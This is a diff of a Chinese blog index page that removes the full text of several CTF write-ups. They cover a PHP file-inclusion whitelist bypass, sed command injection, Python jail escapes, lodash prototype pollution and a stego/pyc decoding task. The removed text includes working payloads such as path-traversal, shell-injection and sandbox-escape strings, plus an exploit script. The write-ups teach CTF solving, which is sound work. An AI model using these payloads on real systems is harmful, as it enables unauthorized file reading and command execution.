@@ -417,21 +417,15 @@
       
         
           
-            <p>phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上</p>
-<p>这篇<a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">文章</a>已经讲的很详细了，这里写一下hctf2018的一道热身题，当时都还没仔细想过是一个已经存在的CVE</p>
-<p>题目源码：</p>
-<p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>题目要绕过不算难，但是有一个地方很重要</p>
-<p>这是我在本地调试的目录：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf0.png" alt=""></p>
-<p>调试的时候我使用了如下payload</p>
-<p><code>http://localhost/audit/warmup.php?file=source.php%253f/../flag.php</code></p>
-<p>此时能够成功绕过</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf1.png" alt=""></p>
-<p>就在这种情况下，文件包含也是成功的！</p>
-<p>所以这题就是这样。。</p>
-
-          
+          phpmyadmin 这个漏洞可以说是由
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/19/phpmyadmin远程文件包含漏洞/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -617,68 +611,17 @@
       
         
           
-            <h2>MISC</h2>
-<h3>he sed shi sed</h3>
-<p>一道很有意思的题目，看了一下源码如下：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line">inp = input(<span class="string">"What you thought you sed\n"</span>)</span><br><span class="line">rep = <span class="string">'/'</span> + input(<span class="string">"What you aren't sure you sed\n"</span>) +  <span class="string">'/'</span> </span><br><span class="line">new = input(<span class="string">"What you actually sed\n"</span>)</span><br><span class="line">cmd = <span class="string">'s'</span> + rep + new + <span class="string">"/g"</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">"'"</span> <span class="keyword">not</span> <span class="keyword">in</span> new:</span><br><span class="line">	cmd += <span class="string">"'"</span></span><br><span class="line">print(<span class="string">"You actually said"</span>)</span><br><span class="line"></span><br><span class="line">system(<span class="string">"echo '"</span> + inp + <span class="string">"' | sed '"</span> +  cmd)</span><br></pre></td></tr></table></figure></p>
-<p>sed命令是一种文本处理的命令， <code>sed s/a/b/g</code> 就是替换</p>
-<p>如果我们输入：
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">What you thought you sed</span><br><span class="line">abcdef</span><br><span class="line">What you aren&apos;t sure you sed</span><br><span class="line">b</span><br><span class="line">What you actually sed</span><br><span class="line">c</span><br><span class="line">You actually said</span><br><span class="line">accdef</span><br></pre></td></tr></table></figure></p>
-<p>可以据此猜测出就是将b替换成了c</p>
-<p>于是猜测命令如下： <code>echo $1 | sed 's/$2/$3/g'</code></p>
-<p>注意到这两种命令的区别
-<img src="https://i.loli.net/2019/08/19/cdaOznu5NMPTD4p.png" alt="quicker_dac8f1e9-20ce-4746-bbbb-27e0bc137879.png"></p>
-<p>于是输入<code>$(ls)</code></p>
-<p>得到的结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed0.png" alt=""></p>
-<p>然后尝试输入<code>'$(ls)'</code></p>
-<p>这个时候就得到结果了，实现了命令注入</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sed1.png" alt=""></p>
-<h2>genericpyjail</h2>
-<p><img src="https://i.loli.net/2019/08/19/iw71jLN54Fvr6KY.png" alt="quicker_4e9a7047-e4a7-477b-86b3-adfc70059d14.png"></p>
-<p>题目给了一个黑名单，并且提示你黑名单是不安全的，也就是要绕过了。</p>
-<p><img src="https://i.loli.net/2019/08/19/SEOXJqPplGFi4U5.png" alt="quicker_f9f6685e-69df-4cfd-b0f7-9a472f9c8395.png"></p>
-<p>很多都被禁止了，那么如何才能够绕过这些限制来达到任意命令执行呢</p>
-<p>这里可以使用unicode编码来绕过限制hhh（没想到吧</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail0.png" alt=""></p>
-<p>或者这样也行：</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/jail1.png" alt=""></p>
-<p>payload:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;\u0066\u003d\u006f\u0070\u0065\u006e\u0028\u0022\u0066\u006c\u0061\u0067\u002e\u0074\u0078\u0074\u0022\u002c\u0020\u0022\u0072\u0022\u0029&apos;.decode(&apos;unicode-escape&apos;)</span><br><span class="line">&apos;\u0070\u0072\u0069\u006e\u0074\u0028\u0066\u002e\u0072\u0065\u0061\u0064\u0028\u0029\u0029&apos;.decode(&apos;unicode-escape&apos;)</span><br><span class="line"></span><br><span class="line">or--</span><br><span class="line"></span><br><span class="line">exit(getattr(locals().get(chr(95)*2+&apos;built&apos;+&apos;ins&apos;+chr(95)*2), &apos;op&apos;+&apos;en&apos;)(&apos;fl&apos;+&apos;ag.txt&apos;).read())</span><br></pre></td></tr></table></figure></p>
-<p>留下一个问题，怎么将字符转为Unicode编码。。</p>
-<h3>Tux Trivia Show</h3>
-<p>一个师傅的exp</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"chall.2019.redpwn.net"</span>, <span class="number">6001</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"!!!"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(p.recv())</span><br><span class="line">        s = p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        s = p.recv()</span><br><span class="line">        print(s)</span><br><span class="line">    print(s)</span><br><span class="line">    s = s[:<span class="number">-1</span>]</span><br><span class="line">    s = s.split(<span class="string">'capital of '</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    ans = check_output([<span class="string">'python3'</span>, <span class="string">'get_capital.py'</span>, s])</span><br><span class="line">    print(ans) </span><br><span class="line">    p.sendline(ans)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
-<p><code>get_capital.py</code>如下：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> countryinfo <span class="keyword">import</span> CountryInfo</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">country = sys.argv[<span class="number">1</span>]</span><br><span class="line">country_obj = CountryInfo(country)</span><br><span class="line"></span><br><span class="line">caps = &#123;<span class="string">'New Mexico'</span>: <span class="string">'Santa Fe'</span>, <span class="string">'Colorado'</span>: <span class="string">'Denver'</span>, <span class="string">'Vermont'</span>: <span class="string">'Montpelier'</span>, <span class="string">'Arizona'</span>: <span class="string">'Phoenix'</span>, <span class="string">'Iowa'</span>: <span class="string">'Des Moines'</span>, <span class="string">'Florida'</span>: <span class="string">'Tallahassee'</span>, <span class="string">'West Virginia'</span>: <span class="string">'Charleston'</span>, <span class="string">'Illinois'</span>: <span class="string">'Springfield'</span>, <span class="string">'Oregon'</span>: <span class="string">'Salem'</span>, <span class="string">'Kansas'</span>: <span class="string">'Topeka'</span>, <span class="string">'Arkansas'</span>: <span class="string">'Little Rock'</span>, <span class="string">'Kentucky'</span>: <span class="string">'Frankfort'</span>, <span class="string">'Massachusetts'</span>: <span class="string">'Boston'</span>, <span class="string">'Texas'</span>: <span class="string">'Austin'</span>, <span class="string">'Wyoming'</span>: <span class="string">'Cheyenne'</span>, <span class="string">'Maryland'</span>: <span class="string">'Annapolis'</span>, <span class="string">'New York'</span>: <span class="string">'Albany'</span>, <span class="string">'New Jersey'</span>: <span class="string">'Trenton'</span>, <span class="string">'Louisiana'</span>: <span class="string">'Baton Rouge'</span>, <span class="string">'South Carolina'</span>: <span class="string">'Columbia'</span>, <span class="string">'Georgia'</span>: <span class="string">'Atlanta'</span>, <span class="string">'Idaho'</span>: <span class="string">'Boise'</span>, <span class="string">'Alaska'</span>: <span class="string">'Juneau'</span>, <span class="string">'Oklahoma'</span>: <span class="string">'Oklahoma City'</span>, <span class="string">'Connecticut'</span>: <span class="string">'Hartford'</span>, <span class="string">'Nebraska'</span>: <span class="string">'Lincoln'</span>, <span class="string">'Tennessee'</span>: <span class="string">'Nashville'</span>, <span class="string">'Pennsylvania'</span>: <span class="string">'Harrisburg'</span>, <span class="string">'Michigan'</span>: <span class="string">'Lansing'</span>, <span class="string">'Maine'</span>: <span class="string">'Augusta'</span>, <span class="string">'Wisconsin'</span>: <span class="string">'Madison'</span>, <span class="string">'South Dakota'</span>: <span class="string">'Pierre'</span>, <span class="string">'California'</span>: <span class="string">'Sacramento'</span>, <span class="string">'New Hampshire'</span>: <span class="string">'Concord'</span>, <span class="string">'Indiana'</span>: <span class="string">'Indianapolis'</span>, <span class="string">'Washington'</span>: <span class="string">'Olympia'</span>, <span class="string">'Utah'</span>: <span class="string">'Salt Lake City'</span>, <span class="string">'Alabama'</span>: <span class="string">'Montgomery'</span>, <span class="string">'Minnesota'</span>: <span class="string">'St. Paul'</span>, <span class="string">'Hawaii'</span>: <span class="string">'Honolulu'</span>, <span class="string">'Ohio'</span>: <span class="string">'Columbus'</span>, <span class="string">'Missouri'</span>: <span class="string">'Jefferson City'</span>, <span class="string">'Delaware'</span>: <span class="string">'Dover'</span>, <span class="string">'Virginia'</span>: <span class="string">'Richmond'</span>, <span class="string">'Nevada'</span>: <span class="string">'Carson City'</span>, <span class="string">'Montana'</span>: <span class="string">'Helena'</span>, <span class="string">'North Dakota'</span>: <span class="string">'Bismarck'</span>, <span class="string">'Mississippi'</span>: <span class="string">'Jackson'</span>, <span class="string">'North Carolina'</span>: <span class="string">'Raleigh'</span>, <span class="string">'Rhode Island'</span>: <span class="string">'Providence'</span>, <span class="string">'Bahamas'</span>: <span class="string">'Nassau'</span>, <span class="string">'Andorra'</span>: <span class="string">'Andorra la Vella'</span>, <span class="string">'East Timor (Timor-Leste)'</span>: <span class="string">'Dili'</span>, <span class="string">'Serbia'</span>: <span class="string">'Belgrade'</span>, <span class="string">'Macedonia'</span>: <span class="string">'Skopje'</span>, <span class="string">'Gambia'</span>: <span class="string">'Banjul'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># with open('usstates.csv', 'r') as f:</span></span><br><span class="line"><span class="comment">#     for l in f:</span></span><br><span class="line"><span class="comment">#         l = l.strip()</span></span><br><span class="line"><span class="comment">#         state, cap = l.split(',')</span></span><br><span class="line"><span class="comment">#         caps[state] = cap</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> country == <span class="string">'Georgia'</span>:</span><br><span class="line">        print(caps[<span class="string">'Georgia'</span>])</span><br><span class="line">    <span class="keyword">elif</span> country == <span class="string">'San Marino'</span>:</span><br><span class="line">        print(<span class="string">'San Marino'</span>)</span><br><span class="line">    <span class="keyword">elif</span> country == <span class="string">'Kiribati'</span>:</span><br><span class="line">        print(<span class="string">'Tarawa'</span>)</span><br><span class="line">    <span class="keyword">elif</span> country == <span class="string">'Moldova'</span>:</span><br><span class="line">        print(<span class="string">'Chisinau'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(country_obj.capital())</span><br><span class="line"><span class="keyword">except</span> KeyError:</span><br><span class="line">    print(caps[country])</span><br></pre></td></tr></table></figure></p>
-<h3>genericpyjail2</h3>
-<p>还是一道python沙盒逃逸的题目</p>
-<p>源码
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">gone = [<span class="string">'open'</span>,<span class="string">'file'</span>,<span class="string">'execfile'</span>,<span class="string">'compile'</span>,<span class="string">'reload'</span>,<span class="string">'__import__'</span>,<span class="string">'eval'</span>,<span class="string">'input'</span>]</span><br><span class="line"><span class="keyword">for</span> func <span class="keyword">in</span> gone:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'wow! again, there\'s a file called flag.txt! insane!'</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      x = raw_input()      </span><br><span class="line">      <span class="keyword">if</span> <span class="string">" "</span> <span class="keyword">in</span> x:</span><br><span class="line">       <span class="keyword">print</span> <span class="string">"no spaces!"</span></span><br><span class="line">       exit()    </span><br><span class="line">      <span class="keyword">print</span> <span class="string">"now it's "</span>, x, <span class="string">"!"</span></span><br><span class="line">      <span class="keyword">exec</span> <span class="string">'x='</span> + x</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">      <span class="keyword">print</span> <span class="string">'Exception: '</span>, e</span><br></pre></td></tr></table></figure></p>
-<p>给出的payload如下</p>
-<p><code>raw_input((42).__class__.__base__.__subclasses__()[40]('flag.txt').read())</code></p>
-<h2>web</h2>
-<h3>blueprint</h3>
-<p>题目给出了源码</p>
-<p>但是这对于不懂JavaScript的我来说又有什么用呢。</p>
-<p>天真的以为是XSS，于是抓包fuzz了一波，但是没有任何结果：</p>
-<p><img src="https://i.loli.net/2019/08/19/ObmNvATC9y2qPtD.png" alt="quicker_7022e4bc-93b6-4fb5-a45f-9f858318ed23.png"></p>
-<p>之后得知这是JavaScript原型污染，具体什么是JavaScript的原型污染之后再说</p>
-<p>可以参考<a href="https://snyk.io/vuln/SNYK-JS-LODASH-450202" target="_blank" rel="noopener">这篇</a>，lodash这个库存在原型链污染</p>
-<p>poc如下</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const mergeFn = require(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line">const payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line">function check() &#123;</span><br><span class="line">    mergeFn(&#123;&#125;, JSON.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[`a0`] === true) &#123;</span><br><span class="line">        console.log(`Vulnerable to Prototype Pollution via $&#123;payload&#125;`);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure></p>
-<p>原体中存在漏洞的代码；</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue1.png" alt=""></p>
-<p>exp
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">user_id = <span class="string">'22b0d010672600233e4ea68da64b1750'</span></span><br><span class="line">url = <span class="string">"http://39.106.125.244:8001/"</span></span><br><span class="line"></span><br><span class="line">r = requests.post(url, cookies=&#123;<span class="string">"user_id"</span>:user_id&#125;, json=&#123;<span class="string">"content"</span>:<span class="string">"yakuhito was here"</span>,<span class="string">"public"</span>:true, <span class="string">"constructor"</span>: &#123;<span class="string">"prototype"</span>: &#123;<span class="string">"public"</span>: true&#125;&#125;&#125;)</span><br><span class="line"></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
-<p>然后就可以看到flag了</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/blue0.png" alt=""></p>
-<p>关于JavaScript原型链污染的文章可以看<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">p牛的</a></p>
-<h3></h3>
-<h2>参考</h2>
-<p><a href="https://kuhi.to/2019/08/15/redpwn-ctf-2019-writeup/#web-2" target="_blank" rel="noopener">Redpwn CTF 2019 – Writeup</a></p>
+          MISC
+he sed shi sed
 
-          
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2019/08/19/redpwnctf复盘/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -864,54 +807,17 @@
       
         
           
-            <h2>bugkuctf——猫片</h2>
-<p><img src="https://i.loli.net/2019/08/19/wZLp2fXUACgbSBn.png" alt="quicker_848b1419-156d-486b-9b3c-6dfc88c64550.png"></p>
-<p>一张猫的图片，题目有三个提示LSB BGR NTFS</p>
-<p>于是用StegSolver去提取数据</p>
-<p>看到了PNG的文件头</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cat0.png" alt=""></p>
-<p>保存下来在Winhex中打开</p>
-<p>修复好图片，然后用微信扫描，（虽然这张图片是颜色反转的，但是新版的微信也能扫出来）</p>
-<p>得到一个rar<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/flag.rar" target="_blank" rel="noopener">压缩文件</a>，用winrar解压报错，于是机智的我用7z解压，然而。。。</p>
-<p>只好去找师傅们的wp，说是NTFS隐写，给了个<a href="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/ntfsstreamseditor.7z" target="_blank" rel="noopener">工具</a></p>
-<p>这时候就有点坑爹了，用7z解压缩的找不到，必须得用winrar解压缩的才行</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cat1.png" alt=""></p>
-<p>得到pyc文件之后需要去这个<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">网站</a>反编译成python代码</p>
-<p>得到python代码：</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">'*************'</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        s = chr(i ^ ord(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = ord(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = ord(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(str(s))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ciphertext[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">'96'</span>,</span><br><span class="line">    <span class="string">'65'</span>,</span><br><span class="line">    <span class="string">'93'</span>,</span><br><span class="line">    <span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'91'</span>,</span><br><span class="line">    <span class="string">'97'</span>,</span><br><span class="line">    <span class="string">'22'</span>,</span><br><span class="line">    <span class="string">'93'</span>,</span><br><span class="line">    <span class="string">'70'</span>,</span><br><span class="line">    <span class="string">'102'</span>,</span><br><span class="line">    <span class="string">'94'</span>,</span><br><span class="line">    <span class="string">'132'</span>,</span><br><span class="line">    <span class="string">'46'</span>,</span><br><span class="line">    <span class="string">'112'</span>,</span><br><span class="line">    <span class="string">'64'</span>,</span><br><span class="line">    <span class="string">'97'</span>,</span><br><span class="line">    <span class="string">'88'</span>,</span><br><span class="line">    <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'82'</span>,</span><br><span class="line">    <span class="string">'137'</span>,</span><br><span class="line">    <span class="string">'90'</span>,</span><br><span class="line">    <span class="string">'109'</span>,</span><br><span class="line">    <span class="string">'99'</span>,</span><br><span class="line">    <span class="string">'112'</span>]</span><br></pre></td></tr></table></figure></p>
-<p>我的解密脚本</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解码</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    ciphertextTemp = ciphertext[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">        s = ciphertextTemp[i]</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = chr(int(s)<span class="number">-10</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = chr(int(s)+<span class="number">10</span>)</span><br><span class="line">        res.append(chr(int(str(ord(s)^i))))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(x <span class="keyword">for</span> x <span class="keyword">in</span> res)</span><br><span class="line"></span><br><span class="line">print(decode())</span><br></pre></td></tr></table></figure></p>
-<h2>whuctf--taxi.png</h2>
-<p>这个题目当时使用matlab提取出来的，不过后来才知道用stegsolver也行</p>
-<p>只需要打开之后浏览不同的通道即可</p>
-<p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/cat2.png" alt=""></p>
-<p><a href="https://tool.lami.fun/jiami/aes" target="_blank" rel="noopener">解密网站</a>
-此时我们简要分析一下StegSolver是如何提取数据的</p>
-<p>给出代码：</p>
